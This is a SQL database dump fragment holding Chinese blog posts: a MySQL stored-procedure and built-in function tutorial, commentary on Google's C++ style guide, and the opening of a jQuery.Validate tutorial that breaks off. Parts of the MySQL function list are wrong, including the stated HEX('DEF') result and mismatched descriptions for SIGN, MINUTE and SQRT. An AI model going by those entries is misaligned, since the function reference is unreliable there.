&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(18); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; else &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(19); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end case; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(3).循环语句</p>\r\n\r\n<p>Ⅰ. while &middot;&middot;&middot;&middot; end while：</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc4() &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare var int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set var=0; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; while var&lt;6 do &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(var); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set var=var+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end while; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Ⅱ. repeat&middot;&middot;&middot;&middot; end repeat：</p>\r\n\r\n<p>它在执行操作后检查结果，而while则是执行前进行检查。</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc5 () &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare v int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=0; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; repeat &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(v); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=v+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; until v&gt;=5 &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end repeat; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><br />\r\nⅢ. loop &middot;&middot;&middot;&middot;&middot;end loop:</p>\r\n\r\n<p>loop循环不需要初始条件，这点和while循环相似，同时和repeat循环一样不需要结束条件, leave语句的意义是离开循环。</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc6 () &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare v int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=0; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; LOOP_LABLE:loop &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(v); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=v+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; if v &gt;=5 then</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; leave LOOP_LABLE; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end if; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end loop; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Ⅳ. LABLES标号：</p>\r\n\r\n<p>标号可以用在begin repeat while或者loop语句前，语句标号只能在合法的语句前面使用。可以跳出循环，使运行指令达到复合语句的最后一步。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(4). ITERATE迭代</p>\r\n\r\n<p>Ⅰ. ITERATE:</p>\r\n\r\n<p>通过引用复合语句的标号,来从新开始复合语句</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc10 () &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare v int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=0; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; LOOP_LABLE:loop &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; if v=3 then &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=v+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; ITERATE LOOP_LABLE; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end if; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(v); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set v=v+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; if v&gt;=5 then</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; leave LOOP_LABLE; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end if; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end loop; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>9.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的基本函数</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(1).字符串类</p>\r\n\r\n<p>CHARSET(str) //返回字串字符集<br />\r\nCONCAT (string2 [,... ]) //连接字串<br />\r\nINSTR (string ,substring ) //返回substring首次在string中出现的位置,不存在返回0<br />\r\nLCASE (string2 ) //转换成小写<br />\r\nLEFT (string2 ,length ) //从string2中的左边起取length个字符<br />\r\nLENGTH (string ) //string长度<br />\r\nLOAD_FILE (file_name ) //从文件读取内容<br />\r\nLOCATE (substring , string [,start_position ] )同INSTR,但可指定开始位置<br />\r\nLPAD (string2 ,length ,pad ) //重复用pad加在string开头,直到字串长度为length<br />\r\nLTRIM (string2 ) //去除前端空格<br />\r\nREPEAT (string2 ,count ) //重复count次<br />\r\nREPLACE (str ,search_str ,replace_str ) //在str中用replace_str替换search_str<br />\r\nRPAD (string2 ,length ,pad) //在str后用pad补充,直到长度为length<br />\r\nRTRIM (string2 ) //去除后端空格<br />\r\nSTRCMP (string1 ,string2 ) //逐字符比较两字串大小,<br />\r\nSUBSTRING (str , position [,length ]) //从str的position开始,取length个字符,<br />\r\n注：mysql中处理字符串时，默认第一个字符下标为1，即参数position必须大于等于1</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; select substring(&#39;abcd&#39;,0,2); &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>| substring(&#39;abcd&#39;,0,2) | &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>1 row in set (0.00 sec) &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; select substring(&#39;abcd&#39;,1,2); &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>| substring(&#39;abcd&#39;,1,2) | &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp; ab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-----------------------+</p>\r\n\r\n<p>1 row in set (0.02 sec) &nbsp;</p>\r\n\r\n<p>TRIM([[BOTH|LEADING|TRAILING] [padding] FROM]string2) //去除指定位置的指定字符<br />\r\nUCASE (string2 ) //转换成大写<br />\r\nRIGHT(string2,length) //取string2最后length个字符<br />\r\nSPACE(count) //生成count个空格</p>\r\n\r\n<p>(2).数学类</p>\r\n\r\n<p>ABS (number2 ) //绝对值<br />\r\nBIN (decimal_number ) //十进制转二进制<br />\r\nCEILING (number2 ) //向上取整<br />\r\nCONV(number2,from_base,to_base) //进制转换<br />\r\nFLOOR (number2 ) //向下取整<br />\r\nFORMAT (number,decimal_places ) //保留小数位数<br />\r\nHEX (DecimalNumber ) //转十六进制<br />\r\n注：HEX()中可传入字符串，则返回其ASC-11码，如HEX(&#39;DEF&#39;)返回4142143<br />\r\n也可以传入十进制整数，返回其十六进制编码，如HEX(25)返回19<br />\r\nLEAST (number , number2 [,..]) //求最小值<br />\r\nMOD (numerator ,denominator ) //求余<br />\r\nPOWER (number ,power ) //求指数<br />\r\nRAND([seed]) //随机数<br />\r\nROUND (number [,decimals ]) //四舍五入,decimals为小数位数]</p>\r\n\r\n<p>注：返回类型并非均为整数，如：<br />\r\n(1)默认变为整形值</p>\r\n\r\n<p>mysql&gt; select round(1.23); &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>| round(1.23) | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>1 row in set (0.00 sec) &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; select round(1.56); &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>| round(1.56) | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>1 row in set (0.00 sec)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(2)可以设定小数位数，返回浮点型数据</p>\r\n\r\n<p>mysql&gt; select round(1.567,2); &nbsp;</p>\r\n\r\n<p>+----------------+</p>\r\n\r\n<p>| round(1.567,2) | &nbsp;</p>\r\n\r\n<p>+----------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.57 | &nbsp;</p>\r\n\r\n<p>+----------------+</p>\r\n\r\n<p>1 row in set (0.00 sec)</p>\r\n\r\n<p>SIGN (number2 ) //</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(3).日期时间类<br />\r\nADDTIME (date2 ,time_interval ) //将time_interval加到date2<br />\r\nCONVERT_TZ (datetime2 ,fromTZ ,toTZ ) //转换时区<br />\r\nCURRENT_DATE ( ) //当前日期<br />\r\nCURRENT_TIME ( ) //当前时间<br />\r\nCURRENT_TIMESTAMP ( ) //当前时间戳<br />\r\nDATE (datetime ) //返回datetime的日期部分<br />\r\nDATE_ADD (date2 , INTERVAL d_value d_type ) //在date2中加上日期或时间<br />\r\nDATE_FORMAT (datetime ,FormatCodes ) //使用formatcodes格式显示datetime<br />\r\nDATE_SUB (date2 , INTERVAL d_value d_type ) //在date2上减去一个时间<br />\r\nDATEDIFF (date1 ,date2 ) //两个日期差<br />\r\nDAY (date ) //返回日期的天<br />\r\nDAYNAME (date ) //英文星期<br />\r\nDAYOFWEEK (date ) //星期(1-7) ,1为星期天<br />\r\nDAYOFYEAR (date ) //一年中的第几天<br />\r\nEXTRACT (interval_name FROM date ) //从date中提取日期的指定部分<br />\r\nMAKEDATE (year ,day ) //给出年及年中的第几天,生成日期串<br />\r\nMAKETIME (hour ,minute ,second ) //生成时间串<br />\r\nMONTHNAME (date ) //英文月份名<br />\r\nNOW ( ) //当前时间<br />\r\nSEC_TO_TIME (seconds ) //秒数转成时间<br />\r\nSTR_TO_DATE (string ,format ) //字串转成时间,以format格式显示<br />\r\nTIMEDIFF (datetime1 ,datetime2 ) //两个时间差<br />\r\nTIME_TO_SEC (time ) //时间转秒数]<br />\r\nWEEK (date_time [,start_of_week ]) //第几周<br />\r\nYEAR (datetime ) //年份<br />\r\nDAYOFMONTH(datetime) //月的第几天<br />\r\nHOUR(datetime) //小时<br />\r\nLAST_DAY(date) //date的月的最后日期<br />\r\nMICROSECOND(datetime) //微秒<br />\r\nMONTH(datetime) //月<br />\r\nMINUTE(datetime) //分返回符号,正负或0<br />\r\nSQRT(number2) //开平方</p>\r\n',0,1437746799,0,0),(47,11,'google内部编写C++的代码规范文档','<p>C++是一门足够复杂的语言.说它&quot;足够复杂&quot;,是因为C++提供了足够多编程范式--泛型, 模板, 面向对象, 异常,等等.顺便说说,我已经很久没有跟进C++的最新发展了(比如C++0x), 所以前面列举出来的特性应该只是C++所有特性的一个部分罢了.C++特性过多很难驾驭好C++的原因之一.另一个原因是C++过于&quot;自作聪明&quot;,在很多地方悄无声息的做了很多事情, 比如隐式的类型转换, 重载, 模板推导等等.而很多时候,这些动作难以察觉,有时候会在你意想不到的地方发生,即使是熟练的C++程序员也难免被误伤.(关于了解C++编译器自作聪明做了哪些事情, &lt;&lt;深入理解C++物件模型&gt;&gt;是不错的选择).<br />\r\n世界上有很多问题, 人们知道如何去解决.但是, 似乎这还不算是最高明的,更高明的做法是学会避免问题的发生.而如何避免问题的发生, 需要经验的积累--曾经犯下错误,吃一堑长一智,于是知道哪些事情是不该做的或者是不应该这么做的.<br />\r\ngoogle C++ code style是google对外公布的一份google内部编写C++的代码规范文档.与其他很多我曾经看过的编码文档一样,里面有一些关于代码风格的规定,也就是代码的外观,这一部分不在这里过多讨论,毕竟代码如何才叫&quot;美观&quot;是一个见仁见智的话题.在这里专门讨论这份文档中对一些C++特性该如何使用的讨论,最后再做一个总结.注意其中的序号并不是文档中的序号,如果要详细了解,可以自己去看这份文档.</p>\r\n\r\n<p>1) Static and Global Variables<br />\r\n&nbsp;&nbsp; Static or global variables of class type are forbidden: they cause hard-to-find bugs due to indeterminate order of construction and destruction.</p>\r\n\r\n<p>google明确禁止全局对象是类对象, 只能是所谓POD(Plain Old Data,如int char等)数据才行.因为C++标准中没有明确规定全局对象的初始化顺序, 假设全局类对象A,B,其中A的初始化依赖于B的值, 那么将无法保证最后的结果.如果非要使用全局类对象, 那么只能使用指针, 在main等函数入口统一进行初始化.</p>\r\n\r\n<p>2) Doing Work in Constructors<br />\r\nIn general, constructors should merely set member variables to their initial values. Any complex initialization should go in an explicit Init() method.</p>\r\n\r\n<p>文档规定, 在类构造函数中对类成员对象做基本的初始化操作, 所有的复杂初始化操作集中一个比如Init()的函数中,理由如下:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; There is no easy way for constructors to signal errors, short of using exceptions (which are forbidden).<br />\r\n&nbsp;&nbsp;&nbsp; If the work fails, we now have an object whose initialization code failed, so it may be an indeterminate state.<br />\r\n&nbsp;&nbsp;&nbsp; If the work calls virtual functions, these calls will not get dispatched to the subclass implementations. Future modification to your class can quietly introduce this problem even if your class is not currently subclassed, causing much confusion.<br />\r\n&nbsp;&nbsp;&nbsp; If someone creates a global variable of this type (which is against the rules, but still), the constructor code will be called before main(), possibly breaking some implicit assumptions in the constructor code. For instance, gflags will not yet have been initialized.</p>\r\n\r\n<p>简单的概括起来也就是:构造函数没有返回值, 难以让使用者感知错误;假如在构造函数中调用虚拟函数, 则无法按照使用者的想法调用到对应子类中实现的虚拟函数(理由是构造函数还未完成意味着这个对象还没有被成功构造完成).</p>\r\n\r\n<p>3) Default Constructors<br />\r\nYou must define a default constructor if your class defines member variables and has no other constructors. Otherwise the compiler will do it for you, badly.</p>\r\n\r\n<p>当程序员没有为类编写一个默认构造函数的时候, 编译器会自动生成一个默认构造函数,而这个编译器生成的函数如何实现(比如如何初始化类成员对象)是不确定的.这样,假如出现问题时将给调试跟踪带来困难.所以, 规范要求每个类都需要编写一个默认构造函数避免这种情况的出现.</p>\r\n\r\n<p>4) Explicit Constructors<br />\r\nUse the C++ keyword explicit for constructors with one argument.</p>\r\n\r\n<p>假如构造函数只有一个参数, 使用explicit避免隐式转换, 因为隐式转换可能在你并不需要的时候出现.</p>\r\n\r\n<p>5) Copy Constructors<br />\r\nProvide a copy constructor and assignment operator only when necessary. Otherwise, disable them with DISALLOW_COPY_AND_ASSIGN.</p>\r\n\r\n<p>只有当必要的时候才需要定义拷贝构造函数和赋值操作符. 同上一条理由一样, 避免一些隐式的转换.另一条理由是,&quot;=&quot;难以跟踪,如果真的要实现类似的功能,可以提供比如名为Copy()的函数,这样子一目了然,不会像赋值操作符那样可能在每个&quot;=&quot;出现的地方出现.</p>\r\n\r\n<p>6) Operator Overloading<br />\r\nDo not overload operators except in rare, special circumstances.</p>\r\n\r\n<p>不要重载操作符.同样, 也是避免莫名其妙的调用了一些函数.同上一条一样, 比如要提供对&quot;==&quot;的重载, 可以提供一个名为Equal()的函数, 如果需要提供对&quot;+&quot;的重载, 可以提供一个名为Add()的函数.</p>\r\n\r\n<p>7) Function Overloading<br />\r\nUse overloaded functions (including constructors) only in cases where input can be specified in different types that contain the same information. Do not use function overloading to simulate default function parameters.</p>\r\n\r\n<p>只有在不同的类型表示同样的信息的时候, 可以使用重载函数.其他情况下,一律不能使用.使用重载, 也可能出现一些隐式出现的转换.所以, 在需要对不同函数进行同样操作的时候, 可以在函数名称上进行区分, 而不是使用重载,如可以提供针对string类型的AppendString()函数, 针对int类型的AppendInt()函数,而不是对string和int类型重载Append()函数.另一个好处在于, 在阅读代码时,通过函数名称可以一目了然.</p>\r\n\r\n<p>8) Exceptions<br />\r\nWe do not use C++ exceptions.</p>\r\n\r\n<p>不使用异常.理由如下:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; When you add a throw statement to an existing function, you must examine all of its transitive callers. Either they must make at least the basic exception safety guarantee, or they must never catch the exception and be happy with the program terminating as a result. For instance, if f() calls g() callsh(), and h throws an exception that f catches, g has to be careful or it may not clean up properly.<br />\r\n&nbsp;&nbsp;&nbsp; More generally, exceptions make the control flow of programs difficult to evaluate by looking at code: functions may return in places you don&#39;t expect. This results maintainability and debugging difficulties. You can minimize this cost via some rules on how and where exceptions can be used, but at the cost of more that a developer needs to know and understand.<br />\r\n&nbsp;&nbsp;&nbsp; Exception safety requires both RAII and different coding practices. Lots of supporting machinery is needed to make writing correct exception-safe code easy. Further, to avoid requiring readers to understand the entire call graph, exception-safe code must isolate logic that writes to persistent state into a &quot;commit&quot; phase. This will have both benefits and costs (perhaps where you&#39;re forced to obfuscate code to isolate the commit). Allowing exceptions would force us to always pay those costs even when they&#39;re not worth it.<br />\r\n&nbsp;&nbsp;&nbsp; Turning on exceptions adds data to each binary produced, increasing compile time (probably slightly) and possibly increasing address space pressure.<br />\r\n&nbsp;&nbsp;&nbsp; The availability of exceptions may encourage developers to throw them when they are not appropriate or recover from them when it&#39;s not safe to do so. For example, invalid user input should not cause exceptions to be thrown. We would need to make the style guide even longer to document these restrictions!</p>\r\n\r\n<p>上面提到的理由中, 我认为使用异常最大的害处就是:异常的使用导致了程序无法按照代码所展现的流程去走的, 比如代码里面写了步骤一二三,但是假如有异常出现, 这就不好预知代码真正步进的步骤了, 在出现问题时, 给调试和跟踪带来困难.<br />\r\n另外, 我更喜欢unix API的设计.熟悉unix编程的人都知道, unix API基本上都遵守下列规则:<br />\r\na) 返回0表示成功, 其他(一般是-1)表示失败.<br />\r\nb) 在失败时, 可以根据errno判断失败的原因, 这些在man手册中都是会清楚的描述.<br />\r\n总结一下, 这份规范中规避的C++特性大致分为以下几类:<br />\r\na) 避免使用那些没有确定行为的特性:如全局变量不能是类对象(初始化顺序不确定), 不使用编译器生成的默认构造函数(构造行为不确定), 异常(代码走向不确定).<br />\r\nb) 避免使用那些隐式发生的操作:如声明单参数构造函数为explict以避免隐式转换, 不定义拷贝构造函数避免隐式的拷贝行为, 不使用操作符重载避免隐式的转换<br />\r\nc) 对模棱两可的特性给予明确的规定:不使用函数重载而是定义对每个类型明确的函数.<br />\r\nd) 即使出错了程序也有办法知道: 比如不能在类构造函数中进行复杂的构造操作, 将这些移动到类Init()的函数中.<br />\r\n同时, 这份文档中描述的大部分C++特性, 都是我之前所熟悉的(除了RTTI之外, 不过这里提到它也是要说明不使用它,另外还提到boost, 不过也是说的要对它&quot;有限制&quot;的使用,比如里面的智能指针).可以看到, 面对这样一门复杂同时还在不停的发展更新特性的语言, google的态度是比较&quot;保守&quot;的.这与我之前对C++的理解也是接近的, 我一直认为C++中需要使用到的特性有基本的面向对象+STL就够了(经过最近的编码实践,我认为还得加个智能指针).我对这个&quot;保守&quot;态度的理解是, 以C++当前的应用场景来看, 这些特性已经足够, 如果使用其他一些更加复杂的, 对人的要求提高了, 代码的可读性以及以后的可维护性就下降了.<br />\r\n前面说过, 避免问题的出现比解决问题来的更加高明些, 而面对C++这一个提供了众多特性, google C++ code style给予了明确的规定, 也就是每个行为, 如果都能做到有明确的动作, 同时结果也都是可以预知的, 那么会将出问题的概率最大可能的降低, 即使出了问题, 也容易跟踪.<br />\r\n上面描述的并不是这份文档中有关C++的所有内容, 只不过我觉得这些更加有同感些, 详细的内容, 可以参看这份文档.都知道google的作品,质量有保证, 除了人的素质确实高之外, 有规范的制度保证也是重要的原因, 毕竟只要是人就会犯错, 为了最大限度的避免人犯错, 有一份详尽的代码规范, 写好哪些该做哪些不该做哪些不该这么做, 也是制度上的保证.另外, 假如每个人都能以一个比较高的标准要求自己所写的代码, 久而久之, 获得进步也是必然的结果.<br />\r\n从这套规范里面, 我的另一个感悟是, 不论是什么行业, &quot;学会如何正确的做事情&quot;, 都是十分必要的.这个&quot;正确的做事情&quot;, 具体到编码来说, 就是代码规范里面提到的那些要求.而除去编码, 做任何的事情, 使用正确的方式做事, 都是尽可能少的避免错误的方法.但是, &quot;错&quot;与&quot;对&quot;是相对而言的, 没有之前&quot;错&quot;的经历, 就不好体会什么叫&quot;对&quot;.所以, &quot;如何正确的做事&quot;, 说到了最后, 还得看个人的经验积累, 有了之前&quot;错误&quot;的经历,才能吃一堑长一智, &quot;错误&quot;并不是一无是处的, 只不过, 并不是谁都去尝试着从中学习.</p>\r\n',0,1437746917,0,0),(48,33,'使用jQuery.Validate进行客户端验证（初级篇）——不使用微软验证控件的理由','<p>以前在做项目的时候就有个很大心病，就是微软的验证控件，虽然微软的验证控件可以帮我们完成大部分的验证，验证也很可靠上手也很容易，但是我就是觉得不爽，主要理由有以下几点：</p>\r\n\r\n<p><br />\r\n1、拖控件太麻烦，这个是微软控件的常用方式，你要使用一个控件你得从工具栏中拖到页面里（当然你也可以不拖手写）。</p>\r\n\r\n<p><br />\r\n2、必须指定验证对象，验证控件与其他textbox，dropdownlist控件不同的是它是验证其他控件的输入是否有效的，所以必须指定所验证的对象。</p>\r\n\r\n<p><br />\r\n3、影响整个页面美观，像一些管理系统总是需要进行大量的用户输入验证，所以就可能导致一个页面上有几十个验证控件严重影响了原来页面里的东西，看起来十分不舒服。</p>\r\n\r\n<p><br />\r\n4、ajax验证不方便，现在的系统越来越注重客户的用户体验，所以ajax验证必不可少，但是微软的验证控件并没有提供ajax验证（当然你也可以通过微软的UpdatePanel来进行），需要自己去扩展。</p>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n\r\n<p><br />\r\n说了上面那么多，我只是表明我的意思，微软的验证控件不太好用，所以这时候我就在想有没一些好用点的验证控件呢？</p>\r\n\r\n<p><br />\r\n有2个方法：1、自己编写一个（考虑到自己水平还没那么高，想想还是算了）</p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、去找一个已经完善的验证控件（这个比较靠谱，毕竟我做不到，别人还是能做到的）</p>\r\n\r\n<p><br />\r\n所以按照我的要求：1、不用拖控件</p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2、不影响页面代码</p>\r\n\r\n<p><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3、简单的AJAX验证</p>\r\n\r\n<p><br />\r\n去网络搜寻找到了2种类型的：1、自己编写的ASP.NET验证控件，虽然封装了比较多的功能但是还是满足不了我需求</p>\r\n\r\n<p><br />\r\n2、javascript类型的验证函数库，这个比较靠谱，毕竟js可以和页面代码分离（不影响页面代码），只需要调用函数库里的验证代码就可以进行指定对象的验证了（不用拖控件），同时ajax本质还是要靠javascript来调用（AJAX验证）</p>\r\n\r\n<p><br />\r\n所以我根据上面第2条线索就搜索使用javascript编写的验证库&mdash;&mdash;jQuery.Validate，这个验证库是属于jQuery的插件，是由bassistance.de编写的，bassistance.de还提供许多jQuery其他插件，如Accordion，Autocomplete（我的使用jQuery.AutoComplete完成仿淘宝商品搜索功能(改进了键盘上下选择体验)就是基于这个autocomplete编写的），Tooltip等等（具体的可以上他们的网站查看）。</p>\r\n\r\n<p><br />\r\n决定使用jQuery.Validate首先下载其JS插件:</p>\r\n\r\n<p>进入http://bassistance.de/jquery-plugins/jquery-plugin-validation/选择DownLoad下载,里面包含了许多示例可供我们学习</p>\r\n\r\n<p>接下来我们就开始正式使用了，建立一个基本的网站，建立好一个母版页（这边使用母版页是因为具体的一些项目中都会有一个母版页来存放一些公用的东西，这边 为了模拟一个真实的环境，所以建立母版页，如果觉得不需要可以不建立直接建立页面即可），然后把jQuery和jQuery.Validate都引入母版页：</p>\r\n\r\n<p>&lt;script src=&#39;&lt;%= Page.ResolveClientUrl(&quot;~/scripts/jquery-1.4.1.js&quot;) %&gt;&#39; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&nbsp;&nbsp;&nbsp;&nbsp; &lt;script src=&#39;&lt;%= Page.ResolveClientUrl(&quot;~/scripts/jquery.validate1.js&quot;) %&gt;&#39; 